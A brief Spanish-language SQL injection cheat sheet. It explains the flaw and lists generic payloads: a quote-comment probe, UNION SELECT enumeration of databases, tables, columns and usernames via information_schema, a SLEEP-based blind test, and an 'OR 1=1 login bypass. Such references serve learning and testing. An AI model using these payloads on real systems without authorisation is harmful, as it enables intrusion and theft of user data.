SQL Injection

¿Qué es SQL Injection?

SQL Injection es una vulnerabilidad que permite la obtención de datos sensibles a partir de la base de datos de una aplicación web. Esta vulnerabilidad se produce cuando una aplicación web no valida correctamente las entradas del usuario y permite la ejecución de consultas SQL maliciosas.

Identificación de vulnerabilidad en la URL

?id=1' -- -

Si una web es vulnerable, podemos hacer inyección SQL.

Enumeración de Bases de Datos

  • UNION SELECT database(); -- Obtener la BD actual
  • UNION SELECT schema_name FROM information_schema.schemata; -- Obtener todas las BD

Enumeración de Tablas

UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = "nombre_de_la_bd";

Enumeración de Columnas

UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = "nombre_de_la_bd" AND table_name = "users";

Extracción de Usuarios

UNION SELECT group_concat(username) FROM users;

SQL Injection Basado en Tiempo (Blind SQLi)

?id=1 AND SLEEP(5); -- Si la página tarda 5 segundos, es vulnerable

Bypassear autenticaciones o consultar datos sin autorización

'OR 1=1;-- -
